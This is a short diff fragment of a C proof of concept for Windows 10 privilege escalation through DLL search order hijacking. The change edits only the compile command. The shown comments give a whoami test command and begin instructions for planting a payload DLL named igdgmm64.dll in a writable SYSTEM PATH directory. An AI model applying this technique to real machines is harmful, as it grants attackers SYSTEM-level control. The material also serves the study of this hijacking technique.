@@ -1,7 +1,7 @@
 #include <windows.h> 
 #include <Winuser.h> 
 // @404death Windows 10 Privilege Escalation Via dll Search Order Hijacking
-// i686-w64-mingw32-gcc -shared -o  C:\Users\Security\Desktop\igdgmm64.dll  C:\Users\Security\Desktop\igdgmm64.c -lcomctl32 -Wl,--subsystem,windows
+// i686-w64-mingw32-gcc -shared -o igdgmm64.dll igdgmm64.c -lcomctl32 -Wl,--subsystem,windows
 // C:\\windows\\system32\\cmd.exe /c whoami > C:\\windows\\temp\\0day.txt
 /*
 1. copy payload dll as igdgmm64.dll to SYSTEM path %PATH% which is writeable such as C:\python27
